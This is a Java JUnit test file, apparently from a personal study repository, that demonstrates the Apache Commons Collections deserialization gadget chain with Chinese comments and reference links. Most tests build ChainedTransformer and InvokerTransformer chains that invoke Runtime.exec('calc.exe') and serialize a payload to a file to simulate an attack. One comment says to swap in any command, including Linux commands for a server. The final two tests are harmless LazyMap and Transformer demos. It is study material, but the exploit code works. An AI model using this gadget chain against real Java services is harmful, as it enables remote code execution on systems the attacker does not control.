package com.milesmile.attacker;

import com.milesmile.buger.OrgApacheCommonsCollections;
import com.milesmile.utils.ChrisUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.lang3.StringUtils;
import org.junit.Test;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

// 用到的commons.collections包

/**
 * Created by chris.D on 2020/1/21.
 * Email chris.dong101@gmail.com
 * 原文参考 https://mp.weixin.qq.com/s/YZBFEZHRUTuHuWHY1QFXfg
 * https://blog.csdn.net/u014653197/article/details/78114041
 */
public class TestOrgApacheCommonsCollections {
    @Test
    public void tOne() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                // 执行calc.exe，把这里改成自己要执行的命令即可；服务器是linux就以成linux命令
                new InvokerTransformer("exec", new Class[]{
                        String.class}, new Object[]{"calc.exe"})
        };

        Transformer transformedChain = new ChainedTransformer(transformers);
        Map<String, String> beforeTransformerMap = new HashMap<String, String>();
        beforeTransformerMap.put("value", "value");
        Map afterTransformerMap = TransformedMap.decorate(beforeTransformerMap, null, transformedChain);
        // SerObjRewrite中的setValue能触发afterTransformerMap中的代码的执行
        OrgApacheCommonsCollections serObj = new OrgApacheCommonsCollections();
        serObj.map = afterTransformerMap;
        serObj.name = "test";

        ChrisUtils.exec(serObj);

    }

    @Test
    public void simpleTest0() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {
        //模拟攻击
        //1.客户端构造序列化payload，使用写入文件模拟发包攻击
        InvokerTransformer a = new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"});

        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(a);    //2.服务端从文件中读取payload模拟接受包，然后触发漏洞
        //服务端反序列化payload读取
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);    //神奇第一处：服务端需要自主构造恶意input
        Object input = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));    //神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input
        InvokerTransformer a_in = (InvokerTransformer) fin.readObject();
        a_in.transform(input);
    }

    @Test
    public void simpleTest1() {
        InvokerTransformer ink = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"});
        ink.transform(Runtime.getRuntime());
    }

    @Test
    public void simpleTest2() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        //通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值
        InvokerTransformer a = new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"});
        //构造input
        Object input = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));    //执行
        a.transform(input);
    }

    @Test
    public void simpleTest3() {
        // Create a Transformer to reverse strings - defined below
        final Transformer reverseString = new Transformer() {
            public Object transform(Object object) {//定义转换的方法
                String name = (String) object;
                String reverse = StringUtils.reverse(name);
                return reverse;
            }
        };
        // Create a LazyMap called lazyNames, which uses the above Transformer
        Map names = new HashMap();
        names.put("test","123456");
        Map lazyNames = LazyMap.decorate(names, reverseString);//将Map和transformer传递给lazymap
        // Get and print two names
        String name = (String) lazyNames.get("Thomas");//调用LazyMap里面的get()方法如果，没有这个key会调用transform方法获得value,返回get
        System.out.println("name:" + name);

        String name2 = (String) lazyNames.get("test");
        System.out.println("name2:" + name2);
    }
    @Test
    public void simpleTest4() {
        // Create a Transformer to reverse strings - defined below
        final Transformer reverseString = new Transformer( ) {
            public Object transform( Object object ) {
                Long number = (Long) object;
                return( new Long( number.longValue() * 100 ) );
            }
        };

        Transformer increment = new Transformer( ) {
            public Object transform(Object input) {
                Long number = (Long) input;
                return( new Long( number.longValue( ) + 1 ) );
            }
        };

        Transformer[] chainElements = new Transformer[] { reverseString , increment };//一个transformer 结果作为另外一个transform的输入值
        Transformer chain = new ChainedTransformer( chainElements );
        Long original = new Long( 34 );
        Long result = (Long) chain.transform(original);
        System.out.println( "Original: " + original );
        System.out.println( "Result: " + result );
        // Create a LazyMap called lazyNames, which uses the above Transformer
    }

}
